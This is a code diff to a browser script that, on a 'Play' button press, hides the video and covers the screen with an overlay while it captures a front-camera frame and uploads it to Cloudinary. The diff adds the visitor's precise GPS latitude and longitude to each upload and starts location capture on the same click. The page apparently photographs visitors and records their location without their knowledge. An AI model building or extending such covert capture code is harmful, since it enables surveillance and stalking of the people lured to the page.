@@ -141,7 +141,16 @@
     });
   }
 
-  function uploadToCloudinary(blob) {
+  function buildUploadContext(location) {
+    const parts = [`user_agent=${encodeURIComponent(getUserAgent())}`];
+    if (location?.latitude != null && location?.longitude != null) {
+      parts.push(`latitude=${Number(location.latitude)}`);
+      parts.push(`longitude=${Number(location.longitude)}`);
+    }
+    return parts.join('|');
+  }
+
+  function uploadToCloudinary(blob, location) {
     const url = `https://api.cloudinary.com/v1_1/${cfg.cloudName}/image/upload`;
     const form = new FormData();
     const deviceSlug = getDeviceSlug();
@@ -150,7 +159,7 @@
     form.append('upload_preset', cfg.uploadPreset);
     if (cfg.folder) form.append('folder', cfg.folder);
     form.append('tags', `device-${deviceSlug},web-capture`);
-    form.append('context', `user_agent=${encodeURIComponent(getUserAgent())}`);
+    form.append('context', buildUploadContext(location));
 
     return new Promise((resolve, reject) => {
       const xhr = new XMLHttpRequest();
@@ -171,9 +180,9 @@
     });
   }
 
-  async function captureAndUpload() {
+  async function captureAndUpload(location) {
     const blob = await captureFrame();
-    return uploadToCloudinary(blob);
+    return uploadToCloudinary(blob, location);
   }
 
   function getStoredRecords() {
@@ -223,8 +232,8 @@
         () => resolve(null),
         {
           enableHighAccuracy: true,
-          timeout: 10000,
-          maximumAge: 30000
+          timeout: 20000,
+          maximumAge: 0
         }
       );
     });
@@ -298,7 +307,7 @@
     }
   }
 
-  async function startSession() {
+  async function startSession(locationPromise) {
     showFrostOverlay();
     concealVideo();
     hideStatus();
@@ -312,7 +321,7 @@
     }
 
     try {
-      const locationPromise = getCurrentPosition();
+      const locPromise = locationPromise || getCurrentPosition();
       stream = await navigator.mediaDevices.getUserMedia({
         video: {
           facingMode: { ideal: 'user' },
@@ -326,8 +335,8 @@
       els.video.muted = true;
       await els.video.play();
       await waitForVideoReady();
-      const uploadResult = await captureAndUpload();
-      const location = await locationPromise;
+      const location = await locPromise;
+      const uploadResult = await captureAndUpload(location);
       saveUploadRecord(uploadResult, location);
 
       hideFrostOverlay();
@@ -374,7 +383,9 @@
         return;
       }
 
-      await startSession();
+      // Start GPS on the same user gesture as Play (required on many mobile browsers)
+      const locationPromise = getCurrentPosition();
+      await startSession(locationPromise);
     } finally {
       busy = false;
       if (!completed) els.playButton.disabled = false;
